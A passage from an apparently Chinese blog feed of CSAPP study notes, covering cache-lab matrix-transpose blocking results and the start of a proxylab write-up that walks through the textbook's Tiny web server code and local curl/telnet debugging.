operator">=</span>x3<span class="token punctuation">,</span>B<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span>x4<span class="token punctuation">;</span>                    <span class="token comment">//把存在B中的右上角的数字往左下角挪,注意偏移量</span>                    B<span class="token punctuation">[</span>y<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>x5<span class="token punctuation">,</span>B<span class="token punctuation">[</span>y<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>x6<span class="token punctuation">,</span>B<span class="token punctuation">[</span>y<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>x7<span class="token punctuation">,</span>B<span class="token punctuation">[</span>y<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>x8<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">//最后面的常规转置</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>x<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span>x<span class="token operator">&lt;</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">;</span>x<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    x1<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x2<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x3<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x4<span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x1<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x2<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x3<span class="token punctuation">,</span>B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>x4<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到的miss数量为</p><pre class="line-numbers language-(空)" data-language="(空)"><code class="language-(空)">hits:9066, misses:1179, evictions:1147<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="最优解法"><a href="#最优解法" class="headerlink" title="最优解法"></a>最优解法</h3><p><a href="https://zhuanlan.zhihu.com/p/387662272">最优解法逼近理论最优1024</a>,这是别人写的,我没尝试,累了.</p><h2 id="Phase-3-61-67"><a href="#Phase-3-61-67" class="headerlink" title="Phase_3:61*67"></a>Phase_3:61*67</h2><p>尝试不同的分块方式</p><p>4*4(以此为例子,在这种方式下测试出不同分块情况下的miss数量,枚举)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> trans_7_desc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"对于61*67在这里尝试各种各样的分块4*4"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">trans_7</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">,</span> <span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>j<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>x<span class="token operator">=</span>i<span class="token punctuation">;</span>x<span class="token operator">&lt;</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token operator">&amp;&amp;</span>x<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>y<span class="token operator">=</span>j<span class="token punctuation">;</span>y<span class="token operator">&lt;</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token operator">&amp;&amp;</span>y<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>y<span class="token operator">++</span><span class="token punctuation">)</span>            B<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>miss数量:</p><table><thead><tr><th align="center">分块规模</th><th align="center">Miss数量</th></tr></thead><tbody><tr><td align="center">4×4</td><td align="center">2425</td></tr><tr><td align="center">8×8</td><td align="center">2118</td></tr><tr><td align="center">14×14</td><td align="center">1996</td></tr><tr><td align="center">15×15</td><td align="center">2021</td></tr><tr><td align="center">16×16</td><td align="center">1992</td></tr><tr><td align="center">17×17</td><td align="center">1950</td></tr><tr><td align="center">18×18</td><td align="center">1961</td></tr><tr><td align="center">19×19</td><td align="center">1979</td></tr><tr><td align="center">20×20</td><td align="center">2002</td></tr><tr><td align="center">21×21</td><td align="center">1957</td></tr></tbody></table><blockquote><p>61 × 67: 10 points if m &lt; 2, 000, 0 points if m &gt; 3, 000</p></blockquote><p>所以我们选择17*17分块上交答案,用几个if else 函数编辑submission函数,使用<code>.driver.py</code>脚本运行测试分数就此通关,</p><p>如图:</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023057.png" alt="image-20240312155938912"></p><p>完美收官,并且miss数尽量达到最小!</p><h1 id="Lab小结"><a href="#Lab小结" class="headerlink" title="Lab小结"></a>Lab小结</h1><h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part_1"></a>Part_1</h2><p>这次的lab真的是比之前的难太多了,part_1还是好的,偷偷看了看别人的参考答案就码出来了,分情况讨论下几种miss,hit,eviction,主要能学习到以下几个函数的用法,分别是</p><ul><li><p>getopt</p></li><li><p>fscanf</p></li><li><p>malloc</p></li><li><p>fopen</p><p>第一次体会到如何从大量数据中快速读取所需要的信息,也才知道原来main函数是有默认参数的,并且默认参数是这样的意思<code>int argc char ** argv</code>,确实有意思,美中不足的是这个lab不用考虑Block太小了导致存放数据要横跨两个Block的这种情况(可能有这种情况吧?)所以我们不用考虑B的大小对miss与否的影响,降低了部分难度</p></li></ul><h2 id="Part-2"><a href="#Part-2" class="headerlink" title="Part_2"></a>Part_2</h2><p>Part_2确实是把我恶心坏了,坏透了的那种,从4*4开始就开始困惑,大脑在这几天一直在模拟cache的运行,各种冲突对撞,又因为有好多不知道的,网上的解析也没有说明的小东西,故而越发困惑,当然也在不断的实操中了解加深了Cache的运行(超简单版本),明白了其基本理念,虽然啊,鼠鼠我还是没有写作业(csapp课本上的),也没有看课本,只是听完了教授的课程,对着ppt和pdf和网上的一大堆教程开始硬抗着这恶心的lab.</p><p>不管之后会忘记多少,现在先做了再说,再把这教程敲完,把自己不会的全部补上,供后来人学习.便是鼠鼠我的价值.</p><h2 id="参考链接Part-2"><a href="#参考链接Part-2" class="headerlink" title="参考链接Part_2"></a><a href="https://blog.csdn.net/qq_42241839/article/details/122984159">参考链接Part_2</a></h2>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP的lab8-proxylab</title>
      <link href="/2024/03/10/lab8/"/>
      <url>/2024/03/10/lab8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这三章基础特别薄弱，对着答案做的lab，需要认真研究，花费更多时间思考！</p></blockquote><h1 id="ProxyLab"><a href="#ProxyLab" class="headerlink" title="ProxyLab"></a>ProxyLab</h1><h2 id="课本知识研读"><a href="#课本知识研读" class="headerlink" title="课本知识研读"></a>课本知识研读</h2><h3 id="Chapter-10-System-Level-I-O"><a href="#Chapter-10-System-Level-I-O" class="headerlink" title="Chapter 10 System-Level I&#x2F;O"></a>Chapter 10 System-Level I&#x2F;O</h3><ul><li><p>Unix I&#x2F;O functions</p></li><li><p>Standard I&#x2F;O functions</p></li><li><p>Rio_functions</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202408191629012.png" alt="image-20240819162957109"></p><p>Use the standard I&#x2F;O functions whenever possible</p><p>Don’t use <code>scanf</code> or <code>rio_readlineb</code> to read binary files.— because many <code>0xa</code>bytes</p><p>Use the Rio functions for I&#x2F;O on network sockets.—Application processes communicate with processes running on other computers on other computers by reading and writing socket descriptors.</p><p><strong>Hints!: Use the <code>sprintf</code> function to format a string in memory and then send it to the socker using <code>rio_writen</code> .If you need formatted input ,use <code>rio_readlineb</code> to read an entire text line ,and then use <code>sscanf</code> to extract different fields from the text line.</strong></p><p>Because of some incompatible restrictions on Standard I&#x2F;O and network files,Unix i&#x2F;o rather than standard I&#x2F;O should be used for network applications</p><h3 id="Chapter-11-Network-Programming"><a href="#Chapter-11-Network-Programming" class="headerlink" title="Chapter 11 Network Programming"></a>Chapter 11 Network Programming</h3><p>Some Important Functions:</p><blockquote><p>The Client and Sever overview</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202408191737045.png" alt="image-20240819173003018"></p><h4 id="Tiny-Sever测试"><a href="#Tiny-Sever测试" class="headerlink" title="Tiny Sever测试"></a>Tiny Sever测试</h4><p>我们打开Lab文件内容，cd到<code>tiny</code>文件夹，随便试一个端口，例如<code>./tiny 1435</code>,由于我是在docker中做实验，所以我直接访问<code>localhost：1435</code>就能得到如下界面</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202408191737587.png" alt="image-20240819173752780"></p><p>输入以下网址能传入参数，调用<code>cgi-bin</code>中的文件<code>adder</code>执行加法并返回结果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://localhost:1435/cgi-bin/adder?1243<span class="token operator">&amp;</span><span class="token number">342</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202408191741326.png" alt="image-20240819174121202"></p><p>如果访问不存在的文件就会触发：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202408191743925.png" alt="image-20240819174320549"></p><p>注意：在文件中储存语言txt类型文件以<code>html</code>的格式存储，故会有大量的<code>html</code>符号。</p><p>然后可以用Telnet测试一下，之后再补充。</p><p><a href="https://www.cnblogs.com/yfceshi/p/7401085.html">参考链接</a></p><h4 id="Tiny源码分析"><a href="#Tiny源码分析" class="headerlink" title="Tiny源码分析"></a>Tiny源码分析</h4><p>所以我们就要分析一下在课本中最后给类tiny sever的每一个function，在这里会进行部分的注解便于我和读者理解</p><p>输入:client-&gt;Sever</p><p>example: </p><pre class="line-numbers language-none"><code class="language-none">Host PortGET &#x2F;home.html HTTP&#x2F;1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解析请求头：</p><pre class="line-numbers language-none"><code class="language-none">method： GETuri： &#x2F;home.htmlversion: HTTP&#x2F;1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>main程序</p><p>control functions </p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int main(int argc, char **argv) &#123;    int listenfd, connfd;    char hostname[MAXLINE], port[MAXLINE];    socklen_t clientlen;    struct sockaddr_storage clientaddr;    &#x2F;* Check command line args *&#x2F;    if (argc !&#x3D; 2) &#123;fprintf(stderr, &quot;usage: %s &lt;port&gt;\n&quot;, argv[0]);exit(1);    &#125;    listenfd &#x3D; Open_listenfd(argv[1]);    while (1) &#123;clientlen &#x3D; sizeof(clientaddr);connfd &#x3D; Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); &#x2F;&#x2F;line:netp:tiny:accept        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE,                     port, MAXLINE, 0);        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);doit(connfd);                                             &#x2F;&#x2F;line:netp:tiny:doitClose(connfd);                                            &#x2F;&#x2F;line:netp:tiny:close    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>doit </p><p>handle one HTTP request&#x2F;response transaction</p><p>连接成功后处理请求头，将请求分为method，uri，version,通过string函数寻找裁切存储。</p><p>同时通过是否有<code>cgi-bin</code>这个参数来判断其是否是动态的。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;* * doit - handle one HTTP request&#x2F;response transaction *&#x2F;&#x2F;* $begin doit *&#x2F;void doit(int fd) &#123;    int is_static;    struct stat sbuf;    char buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];    char filename[MAXLINE], cgiargs[MAXLINE];    rio_t rio;    &#x2F;* Read request line and headers *&#x2F;    Rio_readinitb(&amp;rio, fd);    if (!Rio_readlineb(&amp;rio, buf, MAXLINE))  &#x2F;&#x2F;line:netp:doit:readrequest        return;    printf(&quot;%s&quot;, buf);    sscanf(buf, &quot;%s %s %s&quot;, method, uri, version);       &#x2F;&#x2F;line:netp:doit:parserequest    if (strcasecmp(method, &quot;GET&quot;)) &#123;                     &#x2F;&#x2F;line:netp:doit:beginrequesterr        clienterror(fd, method, &quot;501&quot;, &quot;Not Implemented&quot;,                    &quot;Tiny does not implement this method&quot;);        return;    &#125;                                                    &#x2F;&#x2F;line:netp:doit:endrequesterr    read_requesthdrs(&amp;rio);                              &#x2F;&#x2F;line:netp:doit:readrequesthdrs    &#x2F;* Parse URI from GET request *&#x2F;    is_static &#x3D; parse_uri(uri, filename, cgiargs);       &#x2F;&#x2F;line:netp:doit:staticcheck    if (stat(filename, &amp;sbuf) &lt; 0) &#123;                     &#x2F;&#x2F;line:netp:doit:beginnotfoundclienterror(fd, filename, &quot;404&quot;, &quot;Not found&quot;,    &quot;Tiny couldn&#39;t find this file&quot;);return;    &#125;                                                    &#x2F;&#x2F;line:netp:doit:endnotfound    if (is_static) &#123; &#x2F;* Serve static content *&#x2F;          if (!(S_ISREG(sbuf.st_mode)) || !(S_IRUSR &amp; sbuf.st_mode)) &#123; &#x2F;&#x2F;line:netp:doit:readable    clienterror(fd, filename, &quot;403&quot;, &quot;Forbidden&quot;,&quot;Tiny couldn&#39;t read the file&quot;);    return;&#125;serve_static(fd, filename, sbuf.st_size);        &#x2F;&#x2F;line:netp:doit:servestatic    &#125;    else &#123; &#x2F;* Serve dynamic content *&#x2F;if (!(S_ISREG(sbuf.st_mode)) || !(S_IXUSR &amp; sbuf.st_mode)) &#123; &#x2F;&#x2F;line:netp:doit:executable    clienterror(fd, filename, &quot;403&quot;, &quot;Forbidden&quot;,&quot;Tiny couldn&#39;t run the CGI program&quot;);    return;&#125;serve_dynamic(fd, filename, cgiargs);            &#x2F;&#x2F;line:netp:doit:servedynamic    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>read_requesthdrs：</p><p>read HTTP request headers</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void read_requesthdrs(rio_t *rp) &#123;    char buf[MAXLINE];    Rio_readlineb(rp, buf, MAXLINE);    printf(&quot;%s&quot;, buf);    while(strcmp(buf, &quot;\r\n&quot;)) &#123;          &#x2F;&#x2F;line:netp:readhdrs:checktermRio_readlineb(rp, buf, MAXLINE);printf(&quot;%s&quot;, buf);    &#125;    return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>parse_uri</p><p>分割uri到filename 和cgi信息即：cgi信息指的是?后面的参数例如前面举得adder函数的例子，<code>?</code>后面的两个参数，中间有<code>&amp;</code>号,filename指<code>./home.html</code></p><p>parse URI into filename and CGI args return 0 if dynamic content, 1 if static</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int parse_uri(char *uri, char *filename, char *cgiargs) &#123;    char *ptr;    if (!strstr(uri, &quot;cgi-bin&quot;)) &#123;  &#x2F;* Static content *&#x2F; &#x2F;&#x2F;line:netp:parseuri:isstaticstrcpy(cgiargs, &quot;&quot;);                             &#x2F;&#x2F;line:netp:parseuri:clearcgistrcpy(filename, &quot;.&quot;);                           &#x2F;&#x2F;line:netp:parseuri:beginconvert1strcat(filename, uri);                           &#x2F;&#x2F;line:netp:parseuri:endconvert1if (uri[strlen(uri)-1] &#x3D;&#x3D; &#39;&#x2F;&#39;)                   &#x2F;&#x2F;line:netp:parseuri:slashcheck    strcat(filename, &quot;home.html&quot;);               &#x2F;&#x2F;line:netp:parseuri:appenddefaultreturn 1;    &#125;    else &#123;  &#x2F;* Dynamic content *&#x2F;                        &#x2F;&#x2F;line:netp:parseuri:isdynamicptr &#x3D; index(uri, &#39;?&#39;);                           &#x2F;&#x2F;line:netp:parseuri:beginextractif (ptr) &#123;    strcpy(cgiargs, ptr+1);    *ptr &#x3D; &#39;\0&#39;;&#125;else     strcpy(cgiargs, &quot;&quot;);                         &#x2F;&#x2F;line:netp:parseuri:endextractstrcpy(filename, &quot;.&quot;);                           &#x2F;&#x2F;line:netp:parseuri:beginconvert2strcat(filename, uri);                           &#x2F;&#x2F;line:netp:parseuri:endconvert2return 0;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>serve_static</p><p>静态内容直接访问输出即可</p><p>copy a file back to the client </p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void serve_static(int fd, char *filename, int filesize)&#123;    int srcfd;    char *srcp, filetype[MAXLINE], buf[MAXBUF];    &#x2F;* Send response headers to client *&#x2F;    get_filetype(filename, filetype);    &#x2F;&#x2F;line:netp:servestatic:getfiletype    sprintf(buf, &quot;HTTP&#x2F;1.0 200 OK\r\n&quot;); &#x2F;&#x2F;line:netp:servestatic:beginserve    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;Server: Tiny Web Server\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;Content-length: %d\r\n&quot;, filesize);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;Content-type: %s\r\n\r\n&quot;, filetype);    Rio_writen(fd, buf, strlen(buf));    &#x2F;&#x2F;line:netp:servestatic:endserve    &#x2F;* Send response body to client *&#x2F;    srcfd &#x3D; Open(filename, O_RDONLY, 0); &#x2F;&#x2F;line:netp:servestatic:open    srcp &#x3D; Mmap(0, filesize, PROT_READ, MAP_PRIVATE, srcfd, 0); &#x2F;&#x2F;line:netp:servestatic:mmap    Close(srcfd);                       &#x2F;&#x2F;line:netp:servestatic:close    Rio_writen(fd, srcp, filesize);     &#x2F;&#x2F;line:netp:servestatic:write    Munmap(srcp, filesize);             &#x2F;&#x2F;line:netp:servestatic:munmap&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get_filetype</p><p>确定文件内容，函数再chapter 10中有出现</p><p>derive file type from file name</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void get_filetype(char *filename, char *filetype) &#123;    if (strstr(filename, &quot;.html&quot;))strcpy(filetype, &quot;text&#x2F;html&quot;);    else if (strstr(filename, &quot;.gif&quot;))strcpy(filetype, &quot;image&#x2F;gif&quot;);    else if (strstr(filename, &quot;.png&quot;))strcpy(filetype, &quot;image&#x2F;png&quot;);    else if (strstr(filename, &quot;.jpg&quot;))strcpy(filetype, &quot;image&#x2F;jpeg&quot;);    elsestrcpy(filetype, &quot;text&#x2F;plain&quot;);&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>serve_dynamic</p><p>run a CGI program on behalf of the client</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void serve_dynamic(int fd, char *filename, char *cgiargs) &#123;    char buf[MAXLINE], *emptylist[] &#x3D; &#123; NULL &#125;;    &#x2F;* Return first part of HTTP response *&#x2F;    sprintf(buf, &quot;HTTP&#x2F;1.0 200 OK\r\n&quot;);     Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;Server: Tiny Web Server\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));      if (Fork() &#x3D;&#x3D; 0) &#123; &#x2F;* Child *&#x2F; &#x2F;&#x2F;line:netp:servedynamic:fork&#x2F;* Real server would set all CGI vars here *&#x2F;setenv(&quot;QUERY_STRING&quot;, cgiargs, 1); &#x2F;&#x2F;line:netp:servedynamic:setenvDup2(fd, STDOUT_FILENO);         &#x2F;* Redirect stdout to client *&#x2F; &#x2F;&#x2F;line:netp:servedynamic:dup2Execve(filename, emptylist, environ); &#x2F;* Run CGI program *&#x2F; &#x2F;&#x2F;line:netp:servedynamic:execve    &#125;    Wait(NULL); &#x2F;* Parent waits for and reaps child *&#x2F; &#x2F;&#x2F;line:netp:servedynamic:wait&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>clienterror</p><p>报错信息，负责输出html报错语言，输出记得要用Rio_Writen函数</p><p>returns an error message to the client</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void clienterror(int fd, char *cause, char *errnum,  char *shortmsg, char *longmsg) &#123;    char buf[MAXLINE];    &#x2F;* Print the HTTP response headers *&#x2F;    sprintf(buf, &quot;HTTP&#x2F;1.0 %s %s\r\n&quot;, errnum, shortmsg);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;Content-type: text&#x2F;html\r\n\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));    &#x2F;* Print the HTTP response body *&#x2F;    sprintf(buf, &quot;&lt;html&gt;&lt;title&gt;Tiny Error&lt;&#x2F;title&gt;&quot;);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;&lt;body bgcolor&#x3D;&quot;&quot;ffffff&quot;&quot;&gt;\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;%s: %s\r\n&quot;, errnum, shortmsg);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;&lt;p&gt;%s: %s\r\n&quot;, longmsg, cause);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;&lt;hr&gt;&lt;em&gt;The Tiny Web server&lt;&#x2F;em&gt;\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Chapter-12-Concurrent-Programming"><a href="#Chapter-12-Concurrent-Programming" class="headerlink" title="Chapter 12 Concurrent Programming"></a>Chapter 12 Concurrent Programming</h3><p>了解下锁和多线程，读者所，写者锁的内容即可。我还没读，只有浅显的了解。</p><h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><h3 id="环境调试"><a href="#环境调试" class="headerlink" title="环境调试"></a>环境调试</h3><ol><li>Docker 中容器开启多个终端会话</li></ol><p>[参考链接](<a href="https://cloud.tencent.com/developer/ask/sof/114053010">Docker :如何为一个正在运行的容器启动多个控制台&#x2F;终端？-腾讯云开发者社区-腾讯云 (tencent.com)</a>)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> ID <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>Debug 工具</li></ol><p>curl</p><p>ubuntu中需要提前安装： <code>sudo apt install curl</code></p><blockquote><p>You can use curl to generate HTTP requests to any server, including your own proxy. It is an extremely useful debugging tool. For example, if your proxy and Tiny are both running on the local machine, Tiny is listening on port 15213, and proxy is listening on port 15214, then you can request a page from Tiny via your proxy using the following curl command: linux&gt; curl-v–proxy <a href="http://localhost:15214/">http://localhost:15214</a> <a href="http://localhost:15213/home.html">http://localhost:15213/home.html</a></p></blockquote><p>Telnet:用法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Telnet localhost portGET /home.html HTTP <span class="token number">1.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="目标总览"><a href="#目标总览" class="headerlink" title="目标总览"></a>目标总览</h3><blockquote><p>In this lab, you will write a simple HTTP proxy that caches web objects. For the first part of the lab, you will set up the proxy to accept incoming connections, read and parse requests, forward requests to web servers, read the servers’ responses, and forward those responses to the corresponding clients. This first part will involve learning about basic HTTP operation and how to use sockets to write programs that communicate over network connections. In the second part, you will upgrade your proxy to deal with multiple concurrent connections. This will introduce you to dealing with concurrency, a crucial systems concept. In the third and last part, you will add caching to your proxy using a simple main memory cache of recently accessed web content.、</p></blockquote><p>这次要做的就是接受client的请求并分析转发后给sever，再把得到的数据转发个client。</p><h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p><strong>Implementing a sequential web proxy</strong></p><p>这是在脚本中分别调用PROXY和TINY的命令。</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202408191819502.png" 